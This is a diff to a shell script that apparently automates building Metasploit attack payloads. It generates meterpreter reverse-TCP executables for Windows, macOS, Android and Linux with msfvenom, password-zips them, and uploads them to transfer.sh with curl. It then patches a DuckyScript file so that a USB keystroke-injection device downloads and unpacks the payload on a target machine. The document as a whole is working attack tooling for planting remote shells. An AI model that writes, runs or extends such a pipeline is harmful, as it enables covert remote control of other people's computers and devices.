@@ -92,26 +92,26 @@ echo "\033[1;33m:::: Type "l" for LINUX(.sh)\033[0m"
 read payload_choice
 if [ $payload_choice = "w" ]; then
 	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
-	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest -f exe > ~/msf/temp/$FILE.exe
+	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest -f exe > $TEMP/$FILE.exe
 	echo "\033[1;34m::::Payload ready ::::\033[0m"
 	echo "\033[1;34m::::You choose Windows EXE format::::\033[0m"
 fi
 if [ $payload_choice = "m" ]; then
 	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
-	msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT --smallest -f osx-app > ~/msf/temp/$FILE.app
+	msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT --smallest -f osx-app > $TEMP/$FILE.app
 	echo "\033[1;34m::::Payload ready ::::\033[0m"
 	echo "\033[1;34m::::You choose MacOSX APP format::::\033[0m"
 fi
 if [ $payload_choice = "a" ]; then
 	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
-	msfvenom -p android/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest > ~/msf/temp/$FILE.apk
+	msfvenom -p android/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest > $TEMP/$FILE.apk
 	echo "\033[1;34m::::Payload ready ::::\033[0m"
 	echo "\033[1;34m::::You choose Android APK Format::::\033[0m"
 fi
 
 if [ $payload_choice = "l" ]; then
 	echo "\033[1;34m:::: Creating the payload ::::\033[0m"
-	msfvenom -p linux/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest > ~/msf/temp/$FILE.sh
+	msfvenom -p linux/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest > $TEMP/$FILE.sh
 	echo "\033[1;34m::::Payload ready ::::\033[0m"
 	echo "\033[1;34m::::You choose Linux APK Format::::\033[0m"
 fi
@@ -152,9 +152,10 @@ echo "\033[1;32m$(ls $FOLDER_USEFUL/$FILE)\033[0m"
 echo "\033[1;33m\n:::: DO YOU WANT TO UPLOAD AND ENCRYPT YOUR PAYLOAD ON TRANSFER.SH? \n:::: Type "y" for UPLOAD\n:::: Type "yy" for UPLOAD & ENCRYPT\033[0m\033[1;32m(Alpha version soon)\033[0m\033[1;33m\n:::: or press ENTER for none of that\n\033[0m"
 read UPLOAD_choice
 if [ $UPLOAD_choice = "yy" ]; then
-	zip -e $ENCRYPTEDFILE $TEMP/$FILE
-	echo "\033[1;32m:::: If you want a DuckyScript (only for Windows) please retype your password to update the .dd file, if not type "n"\nHERE (then press enter) ::: \033[0m"
-	read password
+	echo "\033[1;32m:::: Type the encrypted password ::: \033[0m"
+	read password_zip
+	echo "\033[1;32m:::: Encrypting using zip ... ::: \033[0m"
+	zip -P $password_zip $TEMP/$FILE -r $ENCRYPTEDFILE
 	curl --upload-file $ENCRYPTEDFILE https://transfer.sh/reverse.zip > $LINKFILE
 	echo "\033[1;32m:::: Uploading the file into transfer.sh ... \033[0m"
 	echo "\033[1;32m:::: Remember: To download the payload you need to use gpg in your command, like this: \n$ zip -d $FILE\033[0m"
@@ -171,6 +172,8 @@ if [ $UPLOAD_choice = "y" ]; then
 	echo "\n::::The payload has been upload on transfer.sh here:\n \033[1;45m$(cat $LINKFILE)\033[0m"
 fi
 
+#Needs to check if Windows unzip.exe in tmp folder as the right parameters in the dd file
+#
 if [ $password = "" ]; then
 	continue
 else
@@ -178,8 +181,8 @@ else
 	rm $FOLDER_USEFUL/payload.dd
 	echo "$(cat $DDFILEENCRYPTED | sed "s#$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > $FOLDER_USEFUL/payload.dd
 	echo "::::The links have been changed"
-	echo "$(cat $FOLDER_USEFUL/payload.dd | perl -p -e "s/PASSX/$password/")" > $FOLDER_USEFUL//payload.dd
-	curl --upload-file $TEMP/7z.exe https://transfer.sh/7z.exe > $LINK7ZIP
+	echo "$(cat $FOLDER_USEFUL/payload.dd | perl -p -e "s/PASSX/$password_zip/")" > $FOLDER_USEFUL/payload.dd
+	curl --upload-file $TEMP/unzip.exe https://transfer.sh/unzip.exe > $LINK7ZIP
 	echo "$(cat $FOLDER_USEFUL/payload.dd | perl -p -e "s/7ZIPLINK/$LINK7ZIP/")" > $FOLDER_USEFUL/payload.dd
 	echo "::::The archive password has been added to the .dd file (if you encrypt the payload)"
 fi
